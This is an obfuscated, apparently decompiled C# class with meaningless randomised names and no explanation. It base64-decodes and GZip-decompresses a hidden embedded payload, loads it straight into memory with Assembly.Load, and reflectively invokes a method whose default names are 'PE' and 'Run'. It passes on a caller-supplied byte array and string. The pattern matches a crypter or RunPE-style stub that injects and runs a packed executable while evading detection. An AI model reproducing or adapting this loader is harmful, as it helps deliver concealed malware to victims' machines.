using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using e1t9ZoIMs7pU1MfVBaV;
using eC98jAqdnPLlDITmK6;
using etKNQTu9kgqwCqmIAv;

namespace eexZw4yT3VhvAW0jj9;

internal sealed class ep4bAY39IDZCnQWNTS
{
	private static string eWNbTSexZ;

	[NonSerialized]
	internal static eDHHd4vO3FpvmheVMk ew4GT3Vhv;

	static ep4bAY39IDZCnQWNTS()
	{
		try
		{
			eP8e62CD7h90rn5Uih(ePU00P5y8VU1fOKGHm(typeof(ep4bAY39IDZCnQWNTS).TypeHandle));
			eWNbTSexZ = ew4GT3Vhv(13);
		}
		catch (Exception object_)
		{
			eTRai7ZTJMQr21psoF(object_);
			throw;
		}
	}

	private static void e4ZIbpnTa(byte[] byte_0, object[] object_0, string string_0 = "PE", string string_1 = "Run")
	{
		Assembly assembly = default(Assembly);
		MethodInfo method = default(MethodInfo);
		try
		{
			try
			{
				assembly = (Assembly)e7lMpDgP7ffZZj60Cu(byte_0);
				method = e34Dml2u7JdPD5v7wx(assembly, string_0).GetMethod(string_1);
				eai8pFisBLv2eRLt2H(method, null, object_0);
			}
			catch (Exception object_)
			{
				eYgQL0E8W4quT2lVsE(object_);
				ehH1BAYCtoCGEM9UQy();
			}
		}
		catch (Exception object_2)
		{
			eAuh2efrJo0onaFRHD(object_2, assembly, method, byte_0, object_0, string_0, string_1);
			throw;
		}
	}

	public static void eKb3AYt8Z(byte[] byte_0, string string_0)
	{
		object[] array = default(object[]);
		try
		{
			ejZt5SJuILF4BmjOvX();
			if (!eaZktqjUDsdnwKdRug())
			{
				object byte_ = eTcUatoQj32LbTSKWQ(eWNbTSexZ);
				array = new object[2] { byte_0, string_0 };
				e4ZIbpnTa((byte[])byte_, array, ew4GT3Vhv(21921), ew4GT3Vhv(21926));
			}
		}
		catch (Exception object_)
		{
			ecYtUDXsJSby03hkbT(object_, array, byte_0, string_0);
			throw;
		}
	}

	private static byte[] exwyp4bAY(string string_0)
	{
		try
		{
			return (byte[])eUlp63dFG41ZYeiLAK(edH4Mt6p3PXTmtZdWO(string_0));
		}
		catch (Exception object_)
		{
			byte[] object_2 = default(byte[]);
			ecYTZXaNJLJTW5juEL(object_, object_2, string_0);
			throw;
		}
	}

	private static string e9IgDZCnQ(string string_0)
	{
		checked
		{
			byte[] array = default(byte[]);
			MemoryStream memoryStream = default(MemoryStream);
			int num = default(int);
			byte[] array2 = default(byte[]);
			GZipStream gZipStream = default(GZipStream);
			try
			{
				array = (byte[])eUlp63dFG41ZYeiLAK(string_0);
				memoryStream = new MemoryStream();
				num = eDGlL9yFay9O8H67eU(array, 0);
				eVgSamSm3cG9AMWmJY(memoryStream, array, 4, array.Length - 4);
				array2 = new byte[num - 1 + 1];
				eZFHcQDEEiT3HGSicE(memoryStream, 0L);
				gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
				eiRqjxMRCESwhG6xJu(gZipStream, array2, 0, array2.Length);
				return (string)eu7kuybeiKrUsrMPuU(etQ5wSu9guDNI9gleJ(), array2);
			}
			catch (Exception object_)
			{
				string object_2 = default(string);
				eyL8lovDT6MFP0bhdj(object_, num, array2, memoryStream, object_2, array, gZipStream, string_0);
				throw;
			}
		}
	}

	internal static Type ePU00P5y8VU1fOKGHm(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	internal static void eP8e62CD7h90rn5Uih(Type type_0)
	{
		eMbooerndU5ci2DHIZ.e4ZIbpnTa(type_0);
	}

	internal static void eTRai7ZTJMQr21psoF(object object_0)
	{
		eEJNauItTVW1j8pluTb.eulODlten((Exception)object_0);
	}

	internal static bool ejZt5SJuILF4BmjOvX()
	{
		return true;
	}

	internal static bool eaZktqjUDsdnwKdRug()
	{
		return false;
	}

	internal static object e7lMpDgP7ffZZj60Cu(object object_0)
	{
		return Assembly.Load((byte[])object_0);
	}

	internal static Type e34Dml2u7JdPD5v7wx(object object_0, object object_1)
	{
		return ((Assembly)object_0).GetType((string)object_1);
	}

	internal static object eai8pFisBLv2eRLt2H(object object_0, object object_1, object object_2)
	{
		return ((MethodBase)object_0).Invoke(object_1, (object?[]?)object_2);
	}

	internal static void eYgQL0E8W4quT2lVsE(object object_0)
	{
		ProjectData.SetProjectError((Exception)object_0);
	}

	internal static void ehH1BAYCtoCGEM9UQy()
	{
		ProjectData.ClearProjectError();
	}

	internal static void eAuh2efrJo0onaFRHD(object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6)
	{
		eEJNauItTVW1j8pluTb.euXHswL8F((Exception)object_0, object_1, object_2, object_3, object_4, object_5, object_6);
	}

	internal static object eTcUatoQj32LbTSKWQ(object object_0)
	{
		return exwyp4bAY((string)object_0);
	}

	internal static void ecYtUDXsJSby03hkbT(object object_0, object object_1, object object_2, object object_3)
	{
		eEJNauItTVW1j8pluTb.eeN1kpseb((Exception)object_0, object_1, object_2, object_3);
	}

	internal static object edH4Mt6p3PXTmtZdWO(object object_0)
	{
		return e9IgDZCnQ((string)object_0);
	}

	internal static object eUlp63dFG41ZYeiLAK(object object_0)
	{
		return Convert.FromBase64String((string)object_0);
	}

	internal static void ecYTZXaNJLJTW5juEL(object object_0, object object_1, object object_2)
	{
		eEJNauItTVW1j8pluTb.e9jslfSvk((Exception)object_0, object_1, object_2);
	}

	internal static int eDGlL9yFay9O8H67eU(object object_0, int int_0)
	{
		return BitConverter.ToInt32((byte[])object_0, int_0);
	}

	internal static int eiRqjxMRCESwhG6xJu(object object_0, object object_1, int int_0, int int_1)
	{
		return ((GZipStream)object_0).Read((byte[])object_1, int_0, int_1);
	}

	internal static object etQ5wSu9guDNI9gleJ()
	{
		return Encoding.UTF8;
	}

	internal static object eu7kuybeiKrUsrMPuU(object object_0, object object_1)
	{
		return ((Encoding)object_0).GetString((byte[])object_1);
	}

	internal static void eVgSamSm3cG9AMWmJY(object object_0, object object_1, int int_0, int int_1)
	{
		((MemoryStream)object_0).Write((byte[])object_1, int_0, int_1);
	}

	internal static void eZFHcQDEEiT3HGSicE(object object_0, long long_0)
	{
		((MemoryStream)object_0).Position = long_0;
	}

	internal static void eyL8lovDT6MFP0bhdj(object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7)
	{
		eEJNauItTVW1j8pluTb.eo2Gig6Qf((Exception)object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7);
	}
}
